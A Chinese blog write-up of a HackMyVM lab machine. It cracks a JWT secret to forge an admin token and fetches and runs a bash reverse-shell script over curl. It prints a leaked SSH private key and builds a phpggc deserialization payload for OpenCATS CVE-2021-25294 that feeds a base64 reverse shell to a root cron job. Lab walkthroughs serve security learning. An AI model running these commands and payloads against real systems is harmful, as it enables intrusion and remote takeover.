<h2 id="git探测"><a href="#git探测" class="headerlink" title="git探测"></a>git探测</h2><p><img src="https://ooo.0x0.ooo/2024/08/16/OtZMub.png" alt="OtZMub.png" loading="lazy"><br>登录一下<code>gitea:git0ffme</code><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZazl.png" alt="OtZazl.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZoPg.png" alt="OtZoPg.png" loading="lazy"><br>比博燃?翻翻看吧<br>存在一个子域<code>whythisapiissofast.kitty.hmv</code><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZq9B.png" alt="OtZq9B.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZBTs.png" alt="OtZBTs.png" loading="lazy"><br>有个api可以执行命令<br><img src="https://img.picui.cn/free/2024/08/16/66bf51ccb9b0a.png" alt="1723814643050.png" loading="lazy"><br><img src="https://img.picui.cn/free/2024/08/16/66bf528e7f8c0.png" alt="1723814835048.png" loading="lazy"><br>需要认证才能使用这个api，不过还有几个不需要认证的api<br>在一个输入数字的地方试了一下-1结果出来一组账号密码<br><img src="https://img.picui.cn/free/2024/08/16/66bf538cbf061.png" alt="1723815091447.png" loading="lazy"><br><code>nobody:74k3!7345y</code><br>放到login的api看一下,拿到一个jwt:<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzIzODE1NDk0LjA4ODg4NDh9.w4l1KiA-OkIQUU979QQinpnXQZORq1EhZ7v1xAu3z1A</code><br><img src="https://img.picui.cn/free/2024/08/16/66bf5407841fe.png" alt="1723815214974.png" loading="lazy"><br>放到认证里面进行jwt认证<br><img src="https://img.picui.cn/free/2024/08/16/66bf543a51472.png" alt="1723815266314.png" loading="lazy"><br><img src="https://img.picui.cn/free/2024/08/16/66bf5456ed9ab.png" alt="1723815295246.png" loading="lazy"><br>不是admin还不给命令执行，玉玉了，试一下伪造jwt<br><img src="https://img.picui.cn/free/2024/08/16/66bf54f7411b5.png" alt="1723815454206.png" loading="lazy"><br>尝试爆破一下key</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS E:<span class="token punctuation">\</span>我的工具包<span class="token punctuation">\</span>jwt_tool-master<span class="token punctuation">\</span>jwt_tool-master<span class="token operator">></span> python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5vYm9keSIsImlzX2FkbWluIjowLCJleHBpcmVzIjoxNzIzODE1NDk0LjA4ODg4NDh9.w4l1KiA-OkIQUU979QQinpnXQZORq1EhZ7v1xAu3z1A <span class="token parameter variable">-C</span> <span class="token parameter variable">-d</span> .<span class="token punctuation">\</span>rockyou.txt

        <span class="token punctuation">\</span>   <span class="token punctuation">\</span>        <span class="token punctuation">\</span>         <span class="token punctuation">\</span>          <span class="token punctuation">\</span>                    <span class="token punctuation">\</span>
   <span class="token punctuation">\</span>__   <span class="token operator">|</span>   <span class="token operator">|</span>  <span class="token punctuation">\</span>     <span class="token operator">|</span><span class="token punctuation">\</span>__    __<span class="token operator">|</span> <span class="token punctuation">\</span>__    __<span class="token operator">|</span>                    <span class="token operator">|</span>
         <span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token punctuation">\</span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>       <span class="token punctuation">\</span>         <span class="token punctuation">\</span>     <span class="token operator">|</span>
         <span class="token operator">|</span>        <span class="token punctuation">\</span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>    __  <span class="token punctuation">\</span>     __  <span class="token punctuation">\</span>    <span class="token operator">|</span>
  <span class="token punctuation">\</span>      <span class="token operator">|</span>      _     <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
   <span class="token operator">|</span>     <span class="token operator">|</span>     / <span class="token punctuation">\</span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
<span class="token punctuation">\</span>        <span class="token operator">|</span>    /   <span class="token punctuation">\</span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span><span class="token punctuation">\</span>        <span class="token operator">|</span><span class="token punctuation">\</span>        <span class="token operator">|</span>   <span class="token operator">|</span>
 <span class="token punctuation">\</span>______/ <span class="token punctuation">\</span>__/     <span class="token punctuation">\</span>__<span class="token operator">|</span>   <span class="token punctuation">\</span>__<span class="token operator">|</span>      <span class="token punctuation">\</span>__<span class="token operator">|</span> <span class="token punctuation">\</span>______/  <span class="token punctuation">\</span>______/ <span class="token punctuation">\</span>__<span class="token operator">|</span>
 Version <span class="token number">2.2</span>.6                <span class="token punctuation">\</span>______<span class="token operator">|</span>             @ticarpi

Original JWT:

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tested <span class="token number">1</span> million passwords so far
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tested <span class="token number">2</span> million passwords so far
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Tested <span class="token number">3</span> million passwords so far
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> CORRECT key found:
thispasswordismylittlesecret
You can tamper/fuzz the token contents <span class="token punctuation">(</span>-T/-I<span class="token punctuation">)</span> and sign it using:
python3 jwt_tool.py <span class="token punctuation">[</span>options here<span class="token punctuation">]</span> <span class="token parameter variable">-S</span> hs256 <span class="token parameter variable">-p</span> <span class="token string">"thispasswordismylittlesecret"</span></code></pre>
<p>稳了，爆破出key，<code>thispasswordismylittlesecret</code>,然后伪造成admin</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p><img src="https://img.picui.cn/free/2024/08/16/66bf5802a77d3.png" alt="1723816233946.png" loading="lazy"><br>认证完执行命令一直显示Wrong Command<br><img src="https://img.picui.cn/free/2024/08/16/66bf59f022bcb.png" alt="1723816729300.png" loading="lazy"></p>
<p><img src="https://img.picui.cn/free/2024/08/16/66bf5aad96e5a.png" alt="1723816916468.png" loading="lazy"><br>执行wget的时候显示一些特殊的东西，不过我想wget一个反向shell的时候又显示not found<br><img src="https://img.picui.cn/free/2024/08/16/66bf5b3cd727b.png" alt="1723817060459.png" loading="lazy"><br>看了一下wp，没看懂这是什么指令0.0，貌似是必须有wget，但是没有回显<br>写个反向shell放到kali的web服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> /var/www/html/index.html                                                                                                                                                                             <span class="token punctuation">[</span><span class="token number">22</span>:09:19<span class="token punctuation">]</span>
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.1.105/4567  0>&amp;1'</span></code></pre>
<p>然后执行使用curl下载使用bash执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-o</span> shell.sh <span class="token number">192.168</span>.1.105 <span class="token parameter variable">-wget</span>
<span class="token function">bash</span> shell.sh <span class="token parameter variable">-wget</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/var/www/html<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                                                                                                                                                                                        <span class="token punctuation">[</span><span class="token number">22</span>:06:10<span class="token punctuation">]</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.105<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.106<span class="token punctuation">]</span> <span class="token number">59066</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">432</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@kitty:/usr/local/src/FastAPI$ </code></pre>
<p><img src="https://img.picui.cn/free/2024/08/16/66bf5e1f715a8.png" alt="1723817798898.png" loading="lazy"><br>确实必须要有wget，放个-wget不影响命令执行</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@kitty:/home$ <span class="token function">ls</span>
dyutidhara  <span class="token function">git</span>
www-data@kitty:/home$ <span class="token builtin class-name">cd</span> dyutidhara/
bash: cd: dyutidhara/: Permission denied</code></pre>
<p>找了半天没找到如何拿到dyutidhara的权限，看了wp才知道前面落下了一个ssh私钥……<br><img src="https://img.picui.cn/free/2024/08/16/66bf603895986.png" alt="1723818335504.png" loading="lazy"><br>我要是提前拿到私钥不是直接能登录了……</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">oot@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> a.txt <span class="token operator">|</span> <span class="token function">sed</span>  <span class="token string">'s/"//g'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\\n/\n/g'</span>                                                                                                                                                             <span class="token punctuation">[</span><span class="token number">22</span>:29:25<span class="token punctuation">]</span>
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----<span class="token comment">#</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">ot@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  ssh-keygen <span class="token parameter variable">-y</span> <span class="token parameter variable">-f</span> a.txt                                                                                                                                                                                   <span class="token punctuation">[</span><span class="token number">22</span>:32:46<span class="token punctuation">]</span>
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC40lEVDp52xykw5BACH/VSoBkNC9EkYnZ1Y1gGzk1ZNAwDg8LqhpvEE7KZBCRzcq+C0TJDtlAsPI8cLnJDcmFiaMHEeS/Icc1yNegbXLDcVcusYZIaltilviij2yInVmYWfJ7BLlS6LobSDmZbnobMyFYeZuI/4gxQ9QIn+ZiKTM4nPU03bXDZvivdv3vUN+OhFTzWK7eUjwz/cZ5c0M1CvvMcA8A658y4DwpTRpFvqp4vOkvLqsMqdLDyQonXWhoQUj695EQDaQ1miNOPw71nCT199bwgyXTbm8N8Mgj6pqEfW4hocxSMHKLXMEh5wF98tn+vrpFF9W4rEgi82dNZdv8wOshujiQbqAvE28P6wu9AmEPAlkXB8rjSwF7/zeKxW+ZgJW10ANk3NN2ov1fZOL1t4gCF+4HLaOC8xhotFmwk8jeTmDnwIOhrE13so3Eq6W2Dt0c/shcSeCzGQG72Fr2mLH/3zgyD8bMi1YBB0g4QR5TuBzHL+ZPSevpTpRM<span class="token operator">=</span> dyutidhara@free4all</code></pre>
<p>能直接拿到用户名，玉玉了。</p>
<pre class="language-BASH" data-language="BASH"><code class="language-BASH">dyutidhara@kitty:~$ cat &#x2F;etc&#x2F;crontab
# &#x2F;etc&#x2F;crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;
# command to install the new version when you edit this file
# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL&#x3D;&#x2F;bin&#x2F;sh
PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
  *  *  *  *  * root	  [ -f &#x2F;usr&#x2F;local&#x2F;etc&#x2F;newfile.txt ] &amp;&amp; &#x2F;usr&#x2F;bin&#x2F;sed -e &#39;s&#x2F;\[&#123;&quot;Expires&quot;:1,&quot;Discard&quot;:false,&quot;Value&quot;:&quot;&#x2F;&#x2F;&#39; -e &#39;s&#x2F;\\n&quot;&#125;]&#x2F;&#x2F;&#39; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;newfile.txt &gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;payload.txt | for i in $(&#x2F;usr&#x2F;bin&#x2F;cat &#x2F;usr&#x2F;local&#x2F;etc&#x2F;payload.txt); do &#x2F;usr&#x2F;bin&#x2F;echo $i | &#x2F;usr&#x2F;bin&#x2F;base64 -d | &#x2F;usr&#x2F;bin&#x2F;bash; done
17 *	* * *	root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly
25 6	* * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )
47 6	* * 7	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )
52 6	1 * *	root	test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )
#</code></pre>
<p>存在root的定时任务<br>会将<code>/usr/local/etc/newfile.txt</code>里面的内容先替换写入到<code>/usr/local/etc/payload.txt</code>，然后base64解码然后执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">dyutidhara@kitty:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /usr/local
total <span class="token number">40</span>
drwxr-xr-x <span class="token number">10</span> root root  <span class="token number">4096</span> Mar <span class="token number">25</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root root  <span class="token number">4096</span> Jan <span class="token number">12</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Mar <span class="token number">26</span>  <span class="token number">2022</span> bin
drwxrwx---  <span class="token number">2</span> root power <span class="token number">4096</span> Mar <span class="token number">29</span>  <span class="token number">2022</span> etc
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">12</span>  <span class="token number">2022</span> games
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">12</span>  <span class="token number">2022</span> include
drwxr-xr-x  <span class="token number">4</span> root root  <span class="token number">4096</span> Mar <span class="token number">25</span>  <span class="token number">2022</span> lib
lrwxrwxrwx  <span class="token number">1</span> root root     <span class="token number">9</span> Jan <span class="token number">12</span>  <span class="token number">2022</span> <span class="token function">man</span> -<span class="token operator">></span> share/man
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">12</span>  <span class="token number">2022</span> sbin
drwxr-xr-x  <span class="token number">5</span> root root  <span class="token number">4096</span> Mar  <span class="token number">7</span>  <span class="token number">2022</span> share
drwxr-xr-x  <span class="token number">3</span> root root  <span class="token number">4096</span> Mar <span class="token number">28</span>  <span class="token number">2022</span> src</code></pre>
<p>power组才有写入权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">dyutidhara@kitty:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>dyutidhara<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>dyutidhara<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>dyutidhara<span class="token punctuation">)</span>
dyutidhara@kitty:~$ getent group power
power:x:1001:
dyutidhara@kitty:~$ <span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">grep</span> power
power:x:1001:1001::/nonexistent:/usr/sbin/nologin</code></pre>
<p>但是当前组是dyutidhara,并且power这个用户设置了不可登录<br>传个linpeas看看</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">═╣ MySQL connection using default root/root <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. Yes
User	Host	authentication_string
mariadb.sys	localhost	
root	localhost	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
mysql	localhost	invalid
gitea	localhost	*00A51F3F48415C7D4E8908980D443C29C69B60C9
opencats	localhost	*64E2AC2D59D8460E07BCC704FCF131716DA0F295
padding	localhost	*25872B40E94F3C3F940F4E6B8CA08411EFDAD817
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">35</span> Mar <span class="token number">27</span>  <span class="token number">2022</span> /etc/nginx/sites-enabled/opencats -<span class="token operator">></span> /etc/nginx/sites-available/opencats
server <span class="token punctuation">&#123;</span>
	listen <span class="token number">80</span><span class="token punctuation">;</span>
	server_name thisisnotcatitisopencats.kitty.hmv<span class="token punctuation">;</span>
	root /opt/opencats<span class="token punctuation">;</span>
	index index.html index.htm index.php<span class="token punctuation">;</span>
	location ~ <span class="token punctuation">\</span>.php$ <span class="token punctuation">&#123;</span>
		include snippets/fastcgi-php.conf<span class="token punctuation">;</span>
		fastcgi_pass unix:/run/php/power.sock<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>mysql弱口令，还看到了还有一个web服务，猜测拿到这web服务就能拿到power组权限<br>先看一下mysql有没有什么信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show databases<span class="token punctuation">;</span>
+--------------------+
<span class="token operator">|</span> Database           <span class="token operator">|</span>
+--------------------+
<span class="token operator">|</span> gitea              <span class="token operator">|</span>
<span class="token operator">|</span> information_schema <span class="token operator">|</span>
<span class="token operator">|</span> mysql              <span class="token operator">|</span>
<span class="token operator">|</span> opencats           <span class="token operator">|</span>
<span class="token operator">|</span> padding            <span class="token operator">|</span>
<span class="token operator">|</span> performance_schema <span class="token operator">|</span>
+--------------------+
<span class="token number">6</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.001</span> sec<span class="token punctuation">)</span>
                                                                                   </code></pre>
<p>也有个opencats,继续添加子域继续web探测<br><img src="https://img.picui.cn/free/2024/08/16/66bf68ba3aea1.png" alt="1723820509602.png" loading="lazy"><br>是个opencats cms,在MySQL找下user<br><img src="https://ooo.0x0.ooo/2024/08/16/OtZNvj.png" alt="OtZNvj.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZedp.png" alt="OtZedp.png" loading="lazy"><br>拿到admin的密码<code>4jn3y4</code><br><img src="https://ooo.0x0.ooo/2024/08/16/OtZAaU.png" alt="OtZAaU.png" loading="lazy"><br>找一下<code>0.9.5.2</code>版本的漏洞<br><img src="https://ooo.0x0.ooo/2024/08/16/OtZKNY.png" alt="OtZKNY.png" loading="lazy"><br><code>CVE-2021-25294</code>可用<br>细节参考<a href="https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/">https://snoopysecurity.github.io/posts/09_opencats_php_object_injection/</a><br>简单看一下<br>点击activitis里面的data<br><img src="https://img.picui.cn/free/2024/08/16/66bf6eb957d4c.png" alt="1723822050347.png" loading="lazy"><br><img src="https://img.picui.cn/free/2024/08/16/66bf6f049a5d3.png" alt="1723822126057.png" loading="lazy"><br>直接把exp拿来使用，用phpggc生成序列化的payload, 因为要触发定时任务，把base64编码的payload写入到<code>/usr/local/etc/newfile.txt</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> a.sh                                                                                                                                                                                                 <span class="token punctuation">[</span><span class="token number">23</span>:35:37<span class="token punctuation">]</span>
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.1.105/4567  0>&amp;1'</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> a.sh <span class="token operator">|</span> base64 <span class="token operator">></span> a.sh                                                                                                                                                                                 <span class="token punctuation">[</span><span class="token number">23</span>:35:41<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  phpggc <span class="token parameter variable">-u</span> --fast-destruct Guzzle/FW1 /usr/local/etc/newfile.txt  ./a.sh                                                                                                                                  <span class="token punctuation">[</span><span class="token number">23</span>:35:49<span class="token punctuation">]</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$options</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">830</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$parameters</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">831</span>
PHP Deprecated:  Creation of dynamic property PHPGGC<span class="token punctuation">\</span>Enhancement<span class="token punctuation">\</span>Enhancements::<span class="token variable">$enhancements</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line <span class="token number">9</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$enhancements</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">183</span>
ERROR: Unable to <span class="token builtin class-name">read</span> <span class="token builtin class-name">local</span> file: ./a.sh
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  phpggc <span class="token parameter variable">-u</span> --fast-destruct Guzzle/FW1 /usr/local/etc/newfile.txt  /root/Desktop/a.sh                                                                                                                      <span class="token punctuation">[</span><span class="token number">23</span>:36:47<span class="token punctuation">]</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$options</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">830</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$parameters</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">831</span>
PHP Deprecated:  Creation of dynamic property PHPGGC<span class="token punctuation">\</span>Enhancement<span class="token punctuation">\</span>Enhancements::<span class="token variable">$enhancements</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC/Enhancement/Enhancements.php on line <span class="token number">9</span>
PHP Deprecated:  Creation of dynamic property PHPGGC::<span class="token variable">$enhancements</span> is deprecated <span class="token keyword">in</span> /usr/share/phpggc/lib/PHPGGC.php on line <span class="token number">183</span>
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A77%3A%22YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1LzQ1NjcgIDA%2BJjEnCg%3D%3D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A26%3A%22%2Fusr%2Flocal%2Fetc%2Fnewfile.txt%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</code></pre>
<p>把生成的payload替换到url里面</p>
